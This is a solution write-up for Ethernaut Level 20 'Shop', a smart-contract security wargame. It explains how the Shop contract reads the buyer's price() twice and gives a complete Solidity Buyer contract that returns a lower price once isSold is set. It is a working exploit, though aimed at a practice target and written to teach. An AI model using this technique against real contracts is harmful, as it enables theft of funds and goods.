# Level 20: [Shop](https://ethernaut.openzeppelin.com/level/0xCb1c7A4Dee224bac0B47d0bE7bb334bac235F842)

## Level objectives:
Buy the thing for a lower price.
## Analysis
- The contract calling `_buyer.price()` twice. Once to check if the buyer's price is greater than the set price; and the second time to set the price.
```sol
if (_buyer.price() >= price && !isSold) {
  isSold = true;
  price = _buyer.price();
}
```
- So we return different prices for diff calls.
- How do we distinguish between which call?.
- We can't use state variables to store number of calls, cuz our func needs to be `view`.
- So we call the victim contract to see if the object `isSold`.
- Since it's sets the `isSold` variable before setting the price, we can fool it.

## Code:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() view external returns (bool);
}

contract Buyer {
    function attack() public {
        Shop(0x222533E9e1337FC7160f11e668ba7f014D5D75fc).buy();
    }

    function price() view external returns (uint) {
        if (Shop(msg.sender).isSold()) {
            return 50;
        }
        return 100;
    }
}
```

